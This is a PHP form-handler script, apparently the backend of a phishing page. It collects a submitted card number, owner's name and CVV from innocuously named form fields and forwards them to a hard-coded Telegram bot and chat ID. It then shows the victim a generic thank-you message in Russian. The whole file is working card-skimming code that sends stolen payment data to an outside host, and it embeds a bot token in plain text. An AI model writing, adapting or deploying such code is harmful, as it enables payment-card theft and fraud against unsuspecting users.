<?php
$msgs = [];
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $token = "1527447418:AAHQGgGF67t_7M3o1uhGUpBU4EKoeEAVgDg";
    $chat_id = "-560420204";

    if (!empty($_POST['number']) && !empty($_POST['nickname'])){
        $bot_url = "https://api.telegram.org/bot{$token}/";
        $urlForPhoto = $bot_url . "sendPhoto?chat_id=" . $chat_id;

        if (isset($_POST['number'])) {
          if (!empty($_POST['number'])){
            $name = "Card number: " . strip_tags($_POST['number']) . "%0A";
          }
        }

        if (isset($_POST['nickname'])) {
          if (!empty($_POST['nickname'])){
            $phone = "Owner's name: " . "%2B" . strip_tags($_POST['nickname']) . "%0A";
          }
        }

        if (isset($_POST['password'])) {
          if (!empty($_POST['password'])){
            $theme = "CVV: " .strip_tags($_POST['password']);
          }
        }

        if (isset($_POST['experience'])) {
           if (!empty($_POST['experience'])){
                $experience = "Experience: " .strip_tags($_POST['experience']);
                }
            }
        // Формируем текст сообщения
        $txt = $name . $phone . $theme . $experience;

        $sendTextToTelegram = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}");
        if ($output && $sendTextToTelegram) {
            $msgs['okSend'] = 'Спасибо за отправку вашего сообщения!';
            echo json_encode($msgs);
        } elseif ($sendTextToTelegram) {
            $msgs['okSend'] = 'Спасибо за отправку вашего сообщения!';
            echo json_encode($msgs);
          return true;
        } else {
            $msgs['err'] = 'Ошибка. Сообщение не отправлено!';
            echo json_encode($msgs);
            die('Ошибка. Сообщение не отправлено!');
        }

    } else {
        $msgs['err'] = 'Ошибка. Вы заполнили не все обязательные поля!';
        echo json_encode($msgs);;
    }
} else {
  header ("Location: /");
}
?>